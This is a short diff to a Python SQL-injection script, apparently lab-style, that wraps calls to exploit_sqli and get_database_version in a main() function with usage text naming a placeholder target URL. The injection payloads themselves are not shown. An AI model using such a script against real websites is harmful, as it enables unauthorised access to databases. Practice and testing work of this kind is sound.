@@ -34,9 +34,16 @@ def exploit_sqli(url):
     return counter
 
 
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) Usage: {sys.argv[0]} <url>")
+        print(f"(+) Example: {sys.argv[0]} https://target.com/")
+        sys.exit(-1)
 
-if __name__ == '__main__':
     url = sys.argv[1]
     numCols = exploit_sqli(url)
     dbVersion = get_database_version(url, numCols)
-    print(dbVersion)
+    print(f'(+) Database version: {dbVersion}')
+
+if __name__ == "__main__":
+    main()
